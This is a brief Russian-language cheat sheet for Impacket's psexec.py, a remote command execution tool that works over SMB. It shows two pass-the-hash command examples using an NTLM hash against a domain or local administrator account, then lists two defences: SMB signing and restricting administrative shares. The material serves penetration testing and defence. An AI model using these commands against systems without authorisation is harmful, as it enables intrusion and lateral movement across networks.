# psexec.py — удалённое выполнение команд через SMB

## 📦 Установка
Устанавливается вместе с Impacket.

## 🔹 Примеры использования
1. Доменный админ по имени хоста:
```bash
psexec.py DOMAIN/user@HOST -hashes :<NTLM_HASH>
```
2. Локальный админ по IP:
```bash
psexec.py user@192.168.0.10 -hashes :<NTLM_HASH>
```

## 📋 Описание
Позволяет выполнять команды удалённо через SMB, используя пароль или NTLM-хэш.

## 🛡 Защита
- SMB signing.
- Ограничить доступ к административным шарам.
